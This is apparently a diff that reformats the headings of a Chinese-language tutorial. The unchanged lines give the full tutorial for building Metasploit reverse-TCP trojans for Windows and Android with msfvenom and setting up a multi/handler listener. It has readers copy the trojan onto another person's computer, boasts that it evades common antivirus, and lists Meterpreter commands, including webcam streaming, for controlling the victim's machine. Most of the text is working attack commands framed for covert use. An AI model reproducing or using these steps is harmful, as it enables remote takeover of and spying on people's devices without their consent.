@@ -8,7 +8,7 @@
 
 关于所用工具,本文不做过多介绍,这里介绍的使用方法也是最基本最简单的用法，其实不仅仅是windows或者Android，还是Mac，Linux，都可能受到这种攻击:
 
-####1.使用metasploit 工具生存一个木马(windows版本)  ,命令如下:
+### 1.使用metasploit 工具生存一个木马(windows版本)  ,命令如下:
 ```
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.47 LPORT=8080 -f exe >demo.exe
 ```
@@ -16,7 +16,7 @@ LHOST=后面的ip地址是你自己的局域网ip,目前本人所有的攻击测
 
 demo.exe为生成的木马文件,把木马文件拷贝到对方电脑上,双击即可运行!据测试,该木马可以过360安全卫士,电脑管家等常用杀毒软件!这还是在没有做任何加密\加壳的情况下.....不过在有些人的电脑上360可以杀出来!可能是版本不同
 
-####2.打开软件,设置好监听,命令依次如下:
+### 2.打开软件,设置好监听,命令依次如下:
 ```
 use exploit/multi/handler
 set payloads windows/meterpreter/reverse_tcp
@@ -25,7 +25,7 @@ set LPORT 8080
 exploit
 ```
 
-####3.坐等上钩
+### 3.坐等上钩
 此时,只要对方电脑点击运行demo.exe木马文件,这边监听端口就可以收到信息,建立连接!然后可以执行一些入侵指令,对方现在电脑完全在你的掌控之下,常用命令如下:
 ```
 sysinfo     //查看攻击主机的系统信息
@@ -47,7 +47,7 @@ webcam_list　　　//查看摄像头列表
 webcam_stream　 //摄像头视频获取
 ................
 ```
-####4.生成Android版本的木马,其实步骤和上面差不多
+### 4.生成Android版本的木马,其实步骤和上面差不多
 ```
 msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.47 LPORT=8080 -r >demo.apk
 ```
